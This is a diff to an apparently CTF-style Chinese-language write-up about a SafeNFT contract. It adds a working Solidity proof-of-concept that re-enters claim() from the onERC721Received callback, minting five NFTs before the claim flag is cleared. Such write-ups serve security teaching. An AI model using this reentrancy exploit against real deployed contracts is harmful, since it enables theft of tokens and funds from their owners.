@@ -33,4 +33,41 @@ function _safeMint(address to, uint256 tokenId, bytes memory data) internal virt
 
 所以可以写攻击合约用来 `mint` 的接收地址。并在回调方法 `onERC721Received` 再次 `mint`。可以让 `canClaim[msg.sender] = false;` 无法执行到。
 
-### Solve
+### POC
+
+```solidity
+import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+
+contract SafeNFTReveiver is IERC721Receiver {
+    uint expectMintTotalCount = 5;
+    uint mintCount = 0;
+    SafeNFT private safeNFT;
+
+    address owner = msg.sender;
+
+    constructor(address _nftAddress) {
+        safeNFT = SafeNFT(_nftAddress);
+        owner = msg.sender;
+    }
+
+    function attack() external payable {
+        safeNFT.buyNFT{value: msg.value}();
+        safeNFT.claim();
+    }
+
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external returns (bytes4) {
+        safeNFT.transferFrom(address(this), owner, tokenId);
+
+        mintCount++;
+        if (mintCount < expectMintTotalCount) {
+            safeNFT.claim();
+        }
+        return IERC721Receiver.onERC721Received.selector;
+    }
+}
+```
